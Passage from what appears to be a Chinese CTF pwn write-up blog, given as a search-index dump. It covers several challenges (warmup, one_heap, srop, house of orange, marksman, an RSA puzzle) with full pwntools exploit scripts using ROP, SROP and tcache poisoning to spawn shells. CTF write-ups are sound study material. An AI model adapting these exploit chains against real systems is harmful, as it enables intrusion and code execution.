并将之前闹钟剩下的时间返回。根据这一性质，控制返回值，就控制了eax寄存器。 题目分析\rChecksec\r除了开启了NX保护，其他保护全部关闭。运行环境为ubuntu18。 函数分析\rStart\r函数流程为： 设置闹钟为10秒 输出一段话 执行main函数 退出 Main\r很明显的栈溢出，读取结束后程序结束。 漏洞点\r漏洞点就在main函数的read处。addr距离ebp只有0x20的距离，但是可以读取0x34个字节大小。 这时需要使用gdb来看一下，需要覆盖多少。 看一下偏移，为0x20 利用思路\r如果利用read的返回值的话，需要提前布置好栈空间，但是溢出只有0x14个字节，并且每次需要溢出的时候，都会重新把retaddr置为exit函数的地址。如果溢出了，那么输入的字节数肯定超过0xb，所以这是相互矛盾的。因此，考虑从alarm函数入手。由于第一次设置闹钟seconds为0xa，那么往小于这个值的系统调用好来找，发现只有open符合我们的需求。所以，最后的利用思路为： 利用栈溢出，往data段写入flag字符串，为open的系统调用做准备，然后再回到main函数 程序休眠5秒，然后利用栈溢出，执行set_alarm，得到返回值为0x5，然后执行open的系统调用，并回到main函数 栈溢出，利用read(3, data_segment, 0x40)，把flag读取到data段 栈溢出，使用write(1, data_segment, 0x40)输出flag EXP\r调试过程\r不太好调试，但是但其实只要分析栈溢出那一步就行了，之后都是循环执行main函数 调试一下栈溢出的点 welcome_str_addr = 0x80491bc good_luck_str_addr = 0x80491d3 read_addr = 0x804811d write_addr = 0x8048135 main_addr = 0x804815a alarm_addr = 0x804810d mov_ebx_syscall = 0x8048122 layout = ['a' * 0x20, read_addr, main_addr, 0, good_luck_str_addr, 0x60] payload = flat(layout) sh.sendafter(\"Welcome to 0CTF 2016!\\n\", payload) 这里会执行read函数： 符合自己构造的栈布局 最后远程的攻击效果为： 完整exp\rfrom pwn import * sh: tube = process('warmup') context.update(arch='i386', os='linux', endian='little') welcome_str_addr = 0x80491bc good_luck_str_addr = 0x80491d3 read_addr = 0x804811d write_addr = 0x8048135 main_addr = 0x804815a alarm_addr = 0x804810d mov_ebx_syscall = 0x8048122 layout = ['a' * 0x20, read_addr, main_addr, 0, good_luck_str_addr, 0x60] payload = flat(layout) sh.sendafter(\"Welcome to 0CTF 2016!\\n\", payload) sh.sendafter(\"Good Luck!\\n\", \"flag\\x00\") sleep(5) layout = ['a' * 0x20, alarm_addr, mov_ebx_syscall, main_addr, good_luck_str_addr, 0] sh.send(flat(layout)) layout = ['a' * 0x20, read_addr, main_addr, 3, welcome_str_addr, 0x40] sh.recvline() sh.send(flat(layout)) layout = ['a' * 0x20, write_addr, 0xdeadbeef, 1, welcome_str_addr, 0x40] sh.recvline() sh.send(flat(layout)) sh.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki ","date":"2021-05-12","objectID":"/zh-cn/2021-05-12-warmup/:0:0","tags":["pwn"],"title":"warmup","uri":"/zh-cn/2021-05-12-warmup/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： tcache_perthread_struct这个结构体也是阔以释放的，并且可以将它释放到unsorted bin中去，然后分配这个unsorted bin chunk，可以控制任意地址分配堆内存。 题目分析\rChecksec\r题目的环境为ubuntu 18，并且保护全开。 函数分析\rMain\rMenu_get_choice\r这个函数名是我自己取的，是为了方便理解。这里只有两个选项，只能new和delete。接下来，分别看一下这两个选项。 New_note\r需要注意的点有： 分配的chunk的大小限制在0x7f内 分配的数量限制在0xf，也就是这里的malloc_count变量大小 Delete_note\r需要注意的点： 执行完free(ptr)后，没有将指针置空，存在UAF漏洞 最多只能释放4次，也就是free_count的大小 漏洞点\r漏洞出现在delete_note函数处，这里存在UAF漏洞。由于程序的运行环境为ubuntu 18，那么在libc-2.27.so的前几个版本中，引入的tcache bin机制是缺乏校验机制的。也就是，即使对tcache bin chunk重复释放，也不会引发任何异常。比fastbin chunk的约束更少，一来不检查size域，二来也不检查是否重复释放。 但是，程序只提供一个ptr指针来进行堆操作，因此，需要劫持一下tcache_perthread_struct这个结构体。 利用思路\r知识点\rtcache bin dup tcache bin poisoning tacahe_perthread_struct 很多知识点在之前的一些博客里面已经讲过了，这里不再赘叙。 利用过程\r步骤： 调用1次new_note，分配一个0x80大小的chunk 连续释放两次上方分配的chunk 爆破一个字节，将chunk分配到tcache_perthread_struct 修改大小为为0x250大小的chunk的数量，需要超过7，之后释放掉tcache_perthread_struct，使其被放置再在unsorted bin中。 分配这个unsorted bin chunk，首先爆破1个字节，分配到stdout结构体附近，使用stdout来泄露libc地址 分配到__malloc_hook上方，修改__malloc_hook为one_gadget地址，再次分配时即可getshell EXP\r调试过程\r准备好分配与释放函数 def new_note(size, content=\"id\"): sh.sendlineafter(\"Your choice:\", '1') sh.sendlineafter(\"Input the size:\", str(size)) sh.sendlineafter(\"Input the content:\", content) def del_note(): sh.sendlineafter(\"Your choice:\", '2') 利用tcache bin dup分配到tcache_perthread_struct，并修改0x250大小的chunk对应的数量为7。这里需要爆破1个字节，因为保护全开的话，堆地址对齐到内存页，低2个字节一定是?000，这里的代码是手动输入，实际需要爆破，成功率为1/16。 new_note(0x70) del_note() del_note() lw = input(\"one_byte:\") lw = int16(lw) new_note(0x70, p16((lw \u003c\u003c 8) | 0x10)) new_note(0x70) layout = [0, 0, 0, 0, 0x07000000] new_note(0x70, flat(layout)) 显然，这里需要输入0x40 释放掉tcache_perthread_struct del_note() 然后利用unsorted bin的fd与bk指针会留一个libc地址的特性，爆破一个字节，分配到stdout上方，这里直接修改0x50大小的chunk的tcache bins的头指针地址 new_note(0x40, p64(0) * 5) lw = input(\"one_byte:\") lw = int16(lw) new_note(0x10, flat(0, p16((lw \u003c\u003c 8) | 0x60))) 这里就需要输入0x77，可以看到修改成功了 然后利用stdout泄露出libc地址，并修改地址分配chunk到__realloc_hook上方。这里需要调整一下栈帧，所以要借助__realloc_hook。首先del_note是为了能再次修改0x50大小的chunk的头指针。 del_note() new_note(0x40, flat(0xfbad1887, 0, 0, 0, \"\\x58\")) msg = sh.recvn(8) leak_addr = u64(msg) LOG_ADDR(\"leak_addr\", leak_addr) libc_base_addr = leak_addr - 0x3e82a0 LOG_ADDR(\"libc_base_addr\", libc_base_addr) realloc_hook_addr = libc_base_addr + libc.sym[\"__realloc_hook\"] realloc_addr = libc_base_addr + libc.sym[\"realloc\"] gadgets = [0x4f2c5, 0x4f322, 0x10a38c] one_gadget = libc_base_addr + gadgets[2] new_note(0x10, flat(0, p64(realloc_hook_addr)[:6])) 然后任意地址分配： 然后调整栈帧之后，再次分配即可getshell new_note(0x40, flat(one_gadget, realloc_addr+0x4)) new_note(0x10) sh.interactive() 远程需要爆破tcache_perthread_struct的低2位字节，与stdout结构体的低2位字节，远程爆破效果为： 爆破了218次才成功！ 完整exp\rfrom pwn import * # sh:tube = process(\"./sctf_2019_one_heap\") context.update(arch=\"amd64\", os=\"linux\", endian=\"little\") sh = remote(\"node3.buuoj.cn\", 26663) cur_elf = ELF(\"./sctf_2019_one_heap\") libc = cur_elf.libc def LOG_ADDR(*args): pass context.update(arch=\"amd64\", os=\"linux\", endian=\"little\") def new_note(size, content=\"id\"): sh.sendlineafter(\"Your choice:\", '1') sh.sendlineafter(\"Input the size:\", str(size)) sh.sendlineafter(\"Input the content:\", content) def del_note(): sh.sendlineafter(\"Your choice:\", '2') def attack(first, second): new_note(0x70) del_note() del_note() new_note(0x70, p16((first \u003c\u003c 8) | 0x10)) new_note(0x70) layout = [0, 0, 0, 0, 0x07000000] new_note(0x70, flat(layout)) del_note() new_note(0x40, p64(0) * 5) new_note(0x10, flat(0, p16((second \u003c\u003c 8) | 0x60))) del_note() new_note(0x40, flat(0xfbad1887, 0, 0, 0, \"\\x58\")) msg = sh.recvn(8) leak_addr = u64(msg) LOG_ADDR(\"leak_addr\", leak_addr) libc_base_addr = leak_addr - 0x3e82a0 realloc_hook_addr = libc_base_addr + libc.sym[\"__realloc_hook\"] realloc_addr = libc_base_addr + libc.sym[\"realloc\"] gadgets = [0x4f2c5, 0x4f322, 0x10a38c] one_gadget = libc_base_addr + gadgets[2] new_note(0x10, flat(0, p64(realloc_hook_addr)[:6])) new_note(0x40, flat(one_gadget, realloc_addr+0x4)) new_note(0x10) try: sh.sendline(\"id\") sh.recvline_contains(\"uid\", timeout=2","date":"2021-05-03","objectID":"/zh-cn/2021-05-03-sctf-2019-one-heap/:0:0","tags":["pwn"],"title":"sctf_2019_one_heap","uri":"/zh-cn/2021-05-03-sctf-2019-one-heap/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： 要善于从多个方程组中总结出来未知数和已知数的关系，在同余式中，要善于利用余数、最小公倍数和最大公约数一些性质。大数分解是难题，但是两个大数求解公约数是很快的。 当解密指数d比较小的时候，首先采取wiener attack，倘若解不出来，尝试Boneh Durfee Attack。 题目\r题目如下： from Crypto.Util.number import * from secret import url from gmpy2 import * m = bytes_to_long(url) p = getPrime(512) q = getPrime(512) n = p * q d = getPrime(256) e = inverse(d,(p-1)*(q-1)) c = pow(m,e,n) print(n) print(c) m = e p = getPrime(512) q = getPrime(512) n = p * p * q e = 0x10001 d = inverse(e,lcm(p,lcm(p-1,q-1))) c = pow(m,e,n) hint = pow(d,e,n) print(n) print(c) print(hint) ''' 97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441 86143311788363675684674113699193046781796638913243016152555572150858159500527674063754694514501999791875561142925154991000532628799185608465062814546108160434468098898040769021072007374156546314975240583347468026001633652940408779155579339470960571067652924814623371177901052302005289155305089588204204313261 1246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959 952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747 788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684 ''' 题目分析\r题目经过了两轮RSA加密： 第一轮RSA，注意到p和q都是512位，而d只有256位。题目给了n和c，没有给e。 第二轮RSA，这一轮是对上一轮的e进行加密，给出{% raw %}$e = 65537${% endraw %}，给{% raw %}$n = p * p * q${% endraw %}，同时给了hint，并且{% raw %}$hint = d^e \\pmod {phi}${% endraw %}。 既然给了hint，很显然本题就需要从hint入手来进行分析。结合已知信息，来分解出n。推导其实很简单，利用hint能快速地分解出第二轮RSA加密的n。 解题过程\r公式推导\r首先需要分解出第二轮加密的n，推导如下： 设第二轮加密的相关参数有：n、e、hint、p、q 已知的有{% raw %}$n = p * p * q${% endraw %}, {% raw %}$e = 65537${% endraw %}, {% raw %}$h${% endraw %}也已知 根据题目设{% raw %}$phi = lcm(p, lcm(p - 1, q -1))${% endraw %}, {% raw %}$ed === 1 \\pmod {phi}${% endraw %} 那么有式1{% raw %}$e * d = 1 + k_{1} * p${% endraw %}。这是因为p是质数，那么phi一定是p的倍数。 题目又有{% raw %}$hint = d ^ e \\pmod {n}${% endraw %} 所以有式2{% raw %}$d ^ e = hint + k_{2} * p${% endraw %}，因为n也是p的倍数 把式1带入到式2中去有： {% raw %}$(\\frac{1 + k_{1} * p} {e})^e = hint + k_{2} * p${% endraw %} {% raw %}$(1 + k_{1} * p) ^ e = e ^ e *(hint + k_{2} * p)${% endraw %} 这里将上式的左侧展开，可以发现，一定会有一个1，剩下的数也一定是p的倍数，因此有： {% raw %}$(1 + k_{1} * p) ^ e = 1 + k_{3} * p${% endraw %} 因此有： {% raw %}$1 + k_{3}*p = e^e * (hint + k_{2} * p)${% endraw %} 整理一下有： {% raw %}$(k_{3} - k_{2}*e^e) * p = hint * e ^ e -1${% endraw %} 又有： {% raw %}$n = p * p * q${% endraw %} 合理猜测，p是n{% raw %}$hint * e ^ e - 1${% endraw %}的最大公约数。因此可以求{% raw %}$[n, hint * e ^ e -1]${% endraw %}，如果是质数，就印证了猜测。 解题步骤\rimport gmpy2 from Crypto.Util.number import long_to_bytes n = 1246903000089073759886267722667196003041462505274526737638837808213","date":"2021-05-02","objectID":"/zh-cn/2021-05-02-vnctf-2021-whitegive/:0:0","tags":["pwn"],"title":"VNCTF_2021_whitegive","uri":"/zh-cn/2021-05-02-vnctf-2021-whitegive/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： srop用于溢出空间比较大的场景，需要注意：如果将frame的rip设置为syscall;ret，那么rsp指向地址，就是即将下一个栈帧的栈顶。程序会取rsp指向的地址或指令继续执行 leave;ret指令的本质是mov rbp rsp;pop rbp;pop rip srop可以构造多个帧，特别是程序缺乏/bin/sh的时候，第1帧先想办法写/bin/sh\\x00，然后第2帧执行execve 题目分析\rChecksec\r本题的环境为ubuntu 18 函数分析\r连main函数都没有，先看start函数吧 Start\r流程很简单：call 0x401000，然后调用exit退出。 Sub_0x401000\r纯汇编代码，流程是： write(1, buf,0x2a) read(0, rsp-0x40, 0x400) 漏洞点\r题目名叫srop，那肯定是使用srop来做题。溢出点也相当明显，0x400足够构造两个srop的帧了。 利用思路\r知识点\r主要利用srop，参考SROP - CTF Wiki (ctf-wiki.org)，细节就不多讲了。需要注意rip和rsp。一般来说，rip会写成syscall的地址。 利用过程\r主要注意两点：1）本题可利用的gadget不多，并且只有syscall;leave;ret，所以需要注意，这里不需要修改rsp，而是rbp。2）程序中没有/bin/sh，但是有data段，所以需要往data段上写/bin/sh。因此，连续利用两次srop是个不错的方案。 步骤： 首先利用栈溢出，执行read的系统调用，往0x402000上写/bin/sh和第二帧，同时控制rbp，指向让第二帧的signal frame。第二帧就布置在已知地址的data段上。 让第二帧signal frame写入execve，获取shell EXP\r调试过程\r写入第一帧signal frame data_addr = 0x402000 syscall_leave_ret = 0x401033 pop_rax_syscall_leave_ret = 0x401032 syscall_addr = 0x401046 frame = SigreturnFrame(kernel=\"amd64\") frame.rax = 0 # read frame.rdi = 0 # stdin frame.rsi = data_addr frame.rdx = 0x400 frame.rip = syscall_leave_ret frame.rbp = data_addr + 0x20 layout = [0x88 * \"a\", pop_rax_syscall_leave_ret, 0xf, bytes(frame)] # srop to call read, set *data_addr = /bin/sh\\x00 sh.sendlineafter(\"Hey, can i get some feedback for the CTF?\\n\", flat(layout)) 写入第二帧signal frame # call execve /bin/sh layout = [\"/bin/sh\\x00\", \"a\" * 0x20, pop_rax_syscall_leave_ret, 0xf] frame = SigreturnFrame(kernel=\"amd64\") frame.rax = 59 # execve frame.rdi = data_addr # stdin frame.rsi = 0 frame.rdx = 0 frame.rip = syscall_addr layout.append(bytes(frame)) sh.sendline(flat(layout)) sh.interactive() 最后打远程效果为： 完整exp\rfrom pwn import * sh = process(\"rootersctf_2019_srop\") context.update(arch=\"amd64\", os=\"linux\", endian=\"little\") # write /bin/sh on 0x402000 data_addr = 0x402000 syscall_leave_ret = 0x401033 pop_rax_syscall_leave_ret = 0x401032 syscall_addr = 0x401046 frame = SigreturnFrame(kernel=\"amd64\") frame.rax = 0 # read frame.rdi = 0 # stdin frame.rsi = data_addr frame.rdx = 0x400 frame.rip = syscall_leave_ret frame.rbp = data_addr + 0x20 layout = [0x88 * \"a\", pop_rax_syscall_leave_ret, 0xf, bytes(frame)] # srop to call read, set *data_addr = /bin/sh\\x00 sh.sendlineafter(\"Hey, can i get some feedback for the CTF?\\n\", flat(layout)) # call execve /bin/sh layout = [\"/bin/sh\\x00\", \"a\" * 0x20, pop_rax_syscall_leave_ret, 0xf] frame = SigreturnFrame(kernel=\"amd64\") frame.rax = 59 # execve frame.rdi = data_addr # stdin frame.rsi = 0 frame.rdx = 0 frame.rip = syscall_addr layout.append(bytes(frame)) sh.sendline(flat(layout)) sh.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki ","date":"2021-04-30","objectID":"/zh-cn/2021-04-30-rootersctf-2019-srop/:0:0","tags":["pwn"],"title":"rootersctf_2019_srop","uri":"/zh-cn/2021-04-30-rootersctf-2019-srop/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有很多，因为本题涉及到的知识点很多，无法一一详述。主要的收获有： house of orange利用一般发生在程序没有free函数的情况下，需要伪造top chunk的size，下一次分配超过伪造的大小的chunk的时候，就会把old top chunk释放掉，放置在unorted bin中。 伪造top chunk的size需要注意的几点有： size必须要对其到内存页，就是分配的内存大小加上top chunk size，一定是0x1000的倍数。 pre_inuse位要置为1 size不能小于最小的chunk大小 IO_FILE利用时，在libc版本低于2.27的时候，可以利用调用链malloc_printerr-\u003e_libc_message-\u003eabort-\u003e_IO_flush_all_lockup-\u003e_IO_overflow，根据条件伪造IO_FILE结构，vtable表，触发system(/bin/sh)或者one_gadget。 可利用unsorted bin attack修改_IO_list_all指针指向，这个是时候，smallbin(0x60)地址就是前一个假的IO_FILE的chain指针内容。在libc-2.23.so中，伪造得到的fpchain为：main_arena + 0x88—\u003esmallbin[0x60] 想要在堆上留下堆地址，需要利用到largebin，存储largebin的堆头的时候，会在fd_nextsize或bk_nextsize上留下堆地址。 题目分析\r题目环境为ubuntu 16.04，libc-2.23.so。 Checksec\r保护全部拉满！ 函数分析\rMain\r可以看到，典型的菜单题。接下来进menu看看，有哪些选项。 Menu\r3个选项，依次看看 Build_house\r因为我已经建立好了结构体，所以显示的都是price和color之类有属性的变量，简单梳理一下关键流程： 调用build_house次数限制为4次 malloc(0x10) ---\u003e chunk A，用来管理house malloc(input_size) ---\u003e chunk B，其中，$input_size \\in [0, 4096]$，用来存储name read(0, B, input_size)，读取用户输入 calloc(0x8) ---\u003e chunk C，用来存储price和color，这俩加起来才占用8个字节 A[0] = C，A[1] = B，C[0] = (price | color) cur_house_ptr置为chunk A的mem_ptr地址 See_house\r需要注意的是：只能打印当前house的信息，没有提供数组索引之类的东西。 Upgrade_house\r简单梳理一下主要流程： 限制upgrade_house次数为3次 修改当前house，获取用户输入大小alter_size read(0, house-\u003ename, alter_size)，可以溢出修改 漏洞点\r分析完主要函数后，漏洞点很明显。有且只有一个漏洞，就是在upgrade_house的时候，可以溢出修改house_name对应的chunk内容。 需要注意的是，这里的堆溢出，只能修改top_chunk，因为没有提供堆数组和索引。还有，将申请的大小限制在0x1000内，是为了避免使用house of force之类的攻击。同时，题目没有提供释放chunk的函数，没有free的话，基本无法构造堆布局。本题，基本上把利用方式限制在了house of orange。 利用思路\r知识点\rHouse of Orange\r1、利用条件 题目中没有给free之类的接口 可以修改top_chunk的size域 2、利用方法 溢出修改top chunk的size，注意，这里需要滿足一些检查条件 下次申请超过top_chunk size大小的chunk 3、攻击效果 把原来的top_chunk放置在unosrted bin中 FSOP\r其实FSOP的利用方式有很多，结合不同的版本，不同的调用流程，攻击方法也不一样。这里主要谈一下64位下，libc-2.23.so中伪造IO_FILE结构和vtable，触发IO_flush_all_lockup刷新所有流进行攻击的方式。 1、IO_FILE结构 0x0 _flags 0x8 _IO_read_ptr 0x10 _IO_read_end 0x18 _IO_read_base 0x20 _IO_write_base 0x28 _IO_write_ptr 0x30 _IO_write_end 0x38 _IO_buf_base 0x40 _IO_buf_end 0x48 _IO_save_base 0x50 _IO_backup_base 0x58 _IO_save_end 0x60 _markers 0x68 _chain 0x70 _fileno 0x74 _flags2 0x78 _old_offset 0x80 _cur_column 0x82 _vtable_offset 0x83 _shortbuf 0x88 _lock 0x90 _offset 0x98 _codecvt 0xa0 _wide_data 0xa8 _freeres_list 0xb0 _freeres_buf 0xb8 __pad5 0xc0 _mode 0xc4 _unused2 0xd8 vtable vtable的函数指针为： const struct _IO_jump_t _IO_wstrn_jumps attribute_hidden = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_wstr_finish), JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow), JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow), JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow), JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail), JUMP_INIT(xsputn, _IO_wdefault_xsputn), JUMP_INIT(xsgetn, _IO_wdefault_xsgetn), JUMP_INIT(seekoff, _IO_wstr_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_default_setbuf), JUMP_INIT(sync, _IO_default_sync), JUMP_INIT(doallocate, _IO_wdefault_doallocate), JUMP_INIT(read, _IO_default_read), JUMP_INIT(write, _IO_default_write), JUMP_INIT(seek, _IO_default_seek), JUMP_INIT(close, _IO_default_close), JUMP_INIT(stat, _IO_default_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue) }; malloc_printerr最终调用到IO_flush_all_lock，源码位于libio\\vswprintf.c:795 int _IO_flush_all_lockp (int do_lock) { int result = 0; struct _IO_FILE *fp; int last_stamp; #ifdef _IO_MTSAFE_IO __libc_cleanup_region_start (do_lock, flush_cleanup, NULL); if (do_lock) _IO_lock_lock (list_all_lock); #endif last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; // 刷新所有的文件流 while (fp != NULL) { run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-\u003e_mode \u003c= 0 \u0026\u0026 fp-\u003e_IO_write_ptr \u003e fp-\u003e_IO_write_base) #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 \u0026\u0026 fp-\u003e_mode \u003e 0 \u0026\u0026 (fp-\u003e_wide_data-\u003e_IO_write_ptr \u003e fp-\u003e_wide_data-\u003e_IO_write_base)) #endif )// 前面的或语句为真的时候，才会执行到_IO_OVERFLOW(fp, EOF) \u0026\u0026 _IO_OVERFLOW (fp, EOF) == EOF) result = EOF; ······ 要想执行到_IO_OVE","date":"2021-04-24","objectID":"/zh-cn/2021-04-24-houseoforange-hitcon-2016/:0:0","tags":["pwn"],"title":"houseoforange_hitcon_2016","uri":"/zh-cn/2021-04-24-houseoforange-hitcon-2016/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： libc的got表一般是可写的，保护一般是Partial RELRO，即.got.plt是可写的。 one_gadget工具默认只会给出很容易滿足条件的one_gadget，其实还有一些隐藏的one_gagdet可以通过-l/--level来显示出来 exit函数的调用链为exit()-\u003e__run_exit_handlers-\u003e_dl_fini-\u003e__rtld_lock_unlock_recursive，__rtld_lock_unlock_recursive是一个hook指针，可以劫持该函数指针写入one_gadget。一般来说，程序都会调用__libc_start_main，之后调用exit来退出。 题目分析\rChecksec\r函数分析\r本题只包含一个main函数，因此，分析起来也很简单。 Main\r函数的关键流程为： 打印出puts函数的地址 读取stdin输入，并转化为一个int64的整数 读取stdin三个字符，存储到bullets数组中 修改指定内存地址的低3个字节 这里有一个check_bullets，可以跟进去看一下： Check_bullets\r不允许数组的前两个元素同时为0xc5和0xf2，或者0x22和0xf3，或者0x8c和0xa3。 这是为了干啥呢？使用one_gadget工具一看，为了避免这些gadget： 漏洞点\r漏洞点很明显，有两处： 泄露出puts地址，等于给了libc基地址 任意地址写低3个字节 但是，也有一些掣肘，只有写3个字节，似乎还不能写one_gadget，那还能写啥呢。 利用思路\r知识点\r1、一番思考，我去看了看one_gadget的参数，看是不是有啥有关one_gadget我还不知道的参数和命令。 有一个--level参数，可以输出更多的one_gadget。我们来试一试： 可以看到，的确是多了很多one_gadget，但是这些多出来的one_gadget的constraints约束更多了，不仅仅像之前的只需要rsp + 0x40 == NULL这么简单。但是，至少有可用的one_gadget可以试一试。 2、后来解出题后，网上搜了一下wp，发现这位师傅的思路也值得借鉴。去寻找那些约束条件比较宽松的one_gadget上方附近有没有什么值得用的地址。有一个0x10a38c的one_gadget上方： 结合exit函数的调用链，劫持__rtld_lock_unlock_recursive指针，修改为0x10a387，可以绕过check，也能获取shell。但是我试了一下，这个劫持方式可能会失败，并不是百分百成功。 3、根据这位博主梳理的dlopen调用链，可以直到最后会调用____libc_dlopen_mode，最后会调用_dl_catch_error，因此，可以修改该_dl_catch_error@plt+6，更改为one_gadget 4、查看puts函数的调用链，可以看到，会调用strlen函数，因此，也可以修改strlen@got为oe_gadget。 利用过程\r利用思路一： 泄露puts函数地址，计算得到__rtld_lock_unlock_recursive(0x81df60)的偏移 修改__rtld_lock_unlock_recursive低三个字节为0x10a387 利用思路二： 泄露puts函数地址，计算得到_dl_catch_error@plt+6地址 修改_dl_catch_error@plt+6(0x5f4038)地址为one_gadget(0xe569f) EXP\r调试过程\r这里重点调试思路二，同时解释一下，为啥要跳到libc_base + 0x5f4038 首先，泄露出地址，并计算出libc基地址，同时得到需要跳转的地址 sh.recvuntil(\"I placed the target near: \") msg = sh.recvline() puts_addr = int16(msg[:-1].decode()) LOG_ADDR(\"puts_addr\", puts_addr) libc_base_addr = puts_addr - 0x809c0 LOG_ADDR(\"libc_base_addr\", libc_base_addr) one_gadget1 = libc_base_addr + 0xe569f _dl_catch_error_offset = 0x5f4038 target_addr = libc_base_addr + _dl_catch_error_offset 然后，修改目标地址为one_gadget sh.sendlineafter(\"shoot!shoot!\\n\", str(target_addr)) input_gadget = one_gadget1 for _ in range(3): sh.sendlineafter(\"biang!\\n\", chr(input_gadget \u0026 0xff)) input_gadget = input_gadget \u003e\u003e 8 sh.interactive() 获取shell 接着来，解释一下，为啥是0x5f4038。需要设置断点在dlopen处： 然后输入si，步进，发现最终会调用_dl_catch_error： 会call 0x7f64e0d2ad90，所以继续跟进，看看0x7f64e0d2ad90是在做什么： 会跳转到rip+0x2022a2处指向的地址，我们继续步进： 发现这个地址就是0x7f64e0f2d038，所以看下这个地址是哪里，在干什么： 这正是我们上面改的地址，存储着_dl_catch_error@plt+6，所以最终需要更改的偏移为0x5f4038： 完整exp\rfrom pwn import * import functools LOG_ADDR = lambda x, y: log.success('{} ===\u003e {}'.format(x, hex(y))) int16 = functools.partial(int, base=16) sh = process(\"./hfctf_2020_marksman\") sh.recvuntil(\"I placed the target near: \") msg = sh.recvline() puts_addr = int16(msg[:-1].decode()) LOG_ADDR(\"puts_addr\", puts_addr) libc_base_addr = puts_addr - 0x809c0 LOG_ADDR(\"libc_base_addr\", libc_base_addr) one_gadget1 = libc_base_addr + 0x10a387 __rtld_lock_unlock_recursive_offset = 0x81df60 target_addr = libc_base_addr + __rtld_lock_unlock_recursive_offset # one_gadget1 = libc_base_addr + 0xe569f # _dl_catch_error_offset = 0x5f4038 # target_addr = libc_base_addr + _dl_catch_error_offset sh.sendlineafter(\"shoot!shoot!\\n\", str(target_addr)) input_gadget = one_gadget1 for _ in range(3): sh.sendlineafter(\"biang!\\n\", chr(input_gadget \u0026 0xff)) input_gadget = input_gadget \u003e\u003e 8 sh.interactive() 最后远程攻击效果如下： 引用与参考\r1、My Blog 2、exit 利用 3、exit hook 4、dlopen 源码分析 ","date":"2021-04-21","objectID":"/zh-cn/2021-04-21-hfctf-2020-marksman/:0:0","tags":["pwn"],"title":"hfctf_2020_marksman","uri":"/zh-cn/2021-04-21-hfctf-2020-marksman/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： 根据ctfwiki中的前向合并技巧，当不存在一个存储chunk的堆地址的已知地址时，可以利用main_arena+96这个地址来进行unlink利用 unlink利用时，要区分清楚是对哪一个chunk进行unlink tcache bin取用的时候，不会校验size域，只会判断next指针。所以，哪怕size被更改了，也不会引发异常。 题目分析\rChecksec\r本题环境为ubuntu 18，libc版本为2.27。 函数分析\rMain\r可以看到，是个菜单题。首先看看initial中干了什么。 Initial\r调用mmap申请了一块内存，赋予的权限是rwx 打印出了刚刚申请到的内存的地址 Menu\rAllocate\r流程为： 用户输入size，大小不超过0x1000 调用malloc分配内存，并将指针和大小信息存储在ptr_array数组中 打印出存放堆内存的bss段的地址 Delete\r流程为： 输入idx 释放内存，并将ptr_array对应的信息清空 Fill\r取出对应索引的chunk指针和大小 调用read_off_by_null写内存 所以需要看一下写数据的函数是啥样 Read_off_by_null\r很明显，会溢出一个字节，并将后面溢出的字节置为null。 漏洞点\r漏洞点有三个，分别是： Fill函数中，调用的是read_off_by_null，会溢出一个字节。注意到，题目使用的libc版本为2.27，因此，引入了tcache机制。只有当chunk的大小小于0x410的时候，才会把空闲的chunk放到tcache bin里面去，否则会先放到unsorted bin mmap申请了一块具有读写可执行的内存，并打印出了这块内存的地址 在Allocate函数中申请chunk的时候，会把bss段的地址打印出来，等于泄露出程序的基地址 利用思路\r知识点\r前向合并chunk的时候，依托unlink机制，借助main_arena + 96这个地址，可以构造出overlapped chunk 利用过程\r步骤： 申请5块内存，分别为Allocate(0x410)、Allocate(0x28)、Allocate(0x18)、Allocate(0x4f0)、Allocate(0x10)，对应的索引为0、1、2、3、4 释放chunk 0，这个chunk会被放到unsorted bin里面去，fd与bk会被写为main_arena + 96 利用off by null，调用Fill(2)，将chunk 3的presize写为0x470，chunk 3的size被写为0x500。原来应该是0x501。 free(3)，触发unlink，得到一个包裹了chunk 0、1、2、3的大chunk，这个大chunk的size为0x970 依次释放chunk 1和chunk 2，这时候tcache bin[0x20]和tcache bin[0x30]里面各有一个freed chunk 申请chunk 5，Allocate(0x440)，将释放的chunk 1包裹进来，并把tcache bin[0x30]这个地方的chunk的fd写为main_arena + 96 申请chunk 6， Allocate(0x510)， 编辑chunk 5，把freed chunk 1的fd改为mmap分配的那块内存的地址 编辑chunk 6，修改低一个字节为0x30，修改后freed 